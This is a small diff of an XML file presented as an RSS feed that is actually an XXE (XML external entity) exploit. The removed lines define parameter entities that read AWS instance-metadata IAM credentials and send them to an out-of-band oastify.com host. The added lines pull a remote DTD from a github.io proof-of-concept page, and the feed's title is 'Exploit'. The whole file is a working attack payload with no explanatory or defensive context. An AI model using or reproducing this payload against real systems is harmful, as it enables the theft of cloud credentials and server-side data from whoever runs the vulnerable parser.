@@ -1,10 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE test [  
-  <!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
-  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://qe87xwo64k7y2mjj4hjarjfmhdn4b7zw.oastify.com/?data=%file;'>">
-  %eval;
-  %exfiltrate;
+<!DOCTYPE r [
+  <!ENTITY % remote SYSTEM "https://nbvvcghvhjjkgh.github.io/applle-poc/xxe.dtd">
+  %remote;
 ]>
-<rss version="2.0">
-  <channel><title>XXE Test</title></channel>
-</rss>
+<rss version="2.0"><channel><title>Exploit</title></channel></rss>
